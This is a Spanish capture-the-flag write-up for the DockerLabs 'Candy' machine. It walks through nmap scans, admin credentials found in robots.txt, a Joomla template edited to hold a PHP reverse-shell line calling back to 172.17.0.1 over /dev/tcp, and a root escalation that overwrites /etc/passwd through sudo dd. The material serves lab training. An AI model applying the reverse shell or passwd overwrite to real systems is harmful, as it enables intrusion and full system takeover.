#MAQUINA #DOCKERLABS #FACIL 
#JOOMSCAN
<hr>

# RECONOCIMIENTO

Vamos a resolver **Candy** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 13:19 CET
Initiating ARP Ping Scan at 13:19
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 13:19, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:19
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 13:19, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-02 13:19:04 CET for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB

```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 13:19 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000021s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Home
| http-robots.txt: 17 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /un_caramelo /libraries/ /logs/ /modules/
|_http-generator: Joomla! - Open Source Content Management
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 13:20 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /robots.txt: Robots file
|   /administrator/manifests/files/joomla.xml: Joomla version 4.1.2
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Posible **Joomla**.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vemos que hay un robots.txt, encontramos :
**Usuario -> admin**
**Contraseña -> c2FubHVpczEyMzQ1 (base64) -> sanluis12345**

# EXPLOTACION

Templates > Entras a uno desplegado > index.php > retocas un php para darte una reverse shell (	`exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");`  ) .
Mientras te pones en escucha (nc  -nlvp 443)

# ESCALADA PRIVILEGIOS

Enumerando un poco me encuentro con otro_caramelo.txt en **/var/backups/hidden**:

**Usuario -> luisillo**
**Contraseña -> luisillosuperpassword**

YA ESTAMOS COMO LUISILLO.

Vemos si el usuario tiene permisos SUDO:

   ```bash
luisillo@2087e63be8d2:/var$ sudo -l
Matching Defaults entries for luisillo on 2087e63be8d2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 2087e63be8d2:
    (ALL) NOPASSWD: /bin/dd

```

Vemos **bash** con permisos SUDO :

   ```bash
luisillo@2087e63be8d2:~$ echo "hack::0:0:root:/root:/bin/bash" | sudo dd of=/etc/passwd
0+1 records in
0+1 records out
31 bytes copied, 2.2419e-05 s, 1.4 MB/s
luisillo@2087e63be8d2:~$ su hack
hack@2087e63be8d2:/home/luisillo# whoami
hack
hack@2087e63be8d2:/home/luisillo# 
```

**YA ESTAMOS COMO ROOT**